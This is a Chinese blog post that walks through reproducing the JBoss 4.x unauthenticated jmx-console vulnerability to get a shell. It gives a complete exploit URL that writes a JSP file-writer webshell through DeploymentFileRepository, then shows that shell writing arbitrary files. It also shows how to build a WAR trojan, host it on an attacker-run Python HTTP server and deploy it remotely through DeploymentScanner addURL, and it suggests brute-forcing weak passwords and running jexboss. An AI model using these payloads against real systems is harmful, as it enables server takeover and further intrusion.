id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h3><h4 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1:"></a>Method 1:</h4><p><a href="http://your/">http://Your</a> IP/jmx-console  直接访问jboss控制台</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP&#x2F;jmx-console&#x2F;&#x2F;HtmlAdaptor?action&#x3D;invokeOpByName&amp;name&#x3D;jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodName&#x3D;store&amp;argType&#x3D;java.lang.String&amp;arg0&#x3D;August.war&amp;argType&#x3D;java.lang.String&amp;&amp;arg1&#x3D;shell&amp;argType&#x3D;java.lang.String&amp;arg2&#x3D;.jsp&amp;argType&#x3D;java.lang.String&amp;arg3&#x3D;%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&amp;argType&#x3D;boolean&amp;arg4&#x3D;True<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>url中的参数：arg0代表war包的名称，arg1=文件名称，arg2=文件后缀名，arg3=文件内容<br>url解码为：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP&#x2F;jmx-console&#x2F;&#x2F;HtmlAdaptor?action&#x3D;invokeOpByName&amp;name&#x3D;jboss.admin:service&#x3D;DeploymentFileRepository&amp;methodName&#x3D;store&amp;argType&#x3D;java.lang.String&amp;arg0&#x3D;August.war&amp;argType&#x3D;java.lang.String&amp;&amp;arg1&#x3D;shell&amp;argType&#x3D;java.lang.String&amp;arg2&#x3D;.jsp&amp;argType&#x3D;java.lang.String&amp;arg3&#x3D;&lt;%+if(request.getParameter(&quot;f&quot;)!&#x3D;null)(new+java.io.FileOutputStream(application.getRealPath(&quot;&#x2F;&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());+%&gt;&amp;argType&#x3D;boolean&amp;arg4&#x3D;True<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>功能是写入文件，f=文件名，t=文件内容</strong></p><p>写入hack.txt文件</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP&#x2F;August&#x2F;shell.jsp?f&#x3D;hack.txt&amp;t&#x3D;Are you script boy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/5198123176722.png"><br>访问hack.txt文件<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/758824169391.png"></p><hr><h4 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2:"></a>Method 2:</h4><p>首先制作一个war木马（需要jdk），在jsp小马目录下cmd执行：</p><pre class="line-numbers language-none"><code class="language-none">jar cvf shell.war test.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/3179648165946.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/911249179580.png"><br>若报拒绝访问错误，请使用管理员权限运行cmd<br><strong>将war包放在自己的WEB服务器上</strong></p><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 777    #使用python起临时web服务 端口为777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/4961950174686.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/4532151155927.png" alt="\\"></p><hr><p>Jboxx4.x /jmx-console/ 后台存在未授权访问，进入后台后，可直接部署 war 包Getshell。若需登录，可以尝试爆破弱口令登录。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/1174650177184.png"><br>然后找到jboss.deployment（jboss 自带的部署功能）中的flavor=URL,type=DeploymentScanner点进去（通过 url 的方式远程部署）<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/1104253178367.png"><br> 也可以直接输入URL进入：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP&#x2F;jmx-console&#x2F;HtmlAdaptor?action&#x3D;inspectMBean&amp;name&#x3D;jboss.deployment:type&#x3D;DeploymentScanner,flavor&#x3D;URL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="vx_images/4759354173503.png"><br>找到页面中的void addURL()选项来远程加载war包来部署。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/5814456160183.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/3690404160713.png"><br>查看部署是否成功<br>返回到刚进入jmx-console的页面，找到 jboss.web.deployment，如下说明部署成功。如果没显示，多刷新几次页面或者等会儿，直到看到有部署的war包即可</p><h3 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具:"></a>检测工具:</h3><p>检测工具：jexboss，一个使用Python编写的Jboss漏洞检测利用工具，通过它可以检测并利用web-console，jmx-console，JMXInvokerServlet这三个漏洞，并且可以获得一个shell。<br>使用：</p><pre class="line-numbers language-none"><code class="language-none">python jexboss.py -u http:&#x2F;&#x2F;ip:port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/2538330172164.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JBOSS </tag>
            
            <tag> JBOSS未授权访问Getshell </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
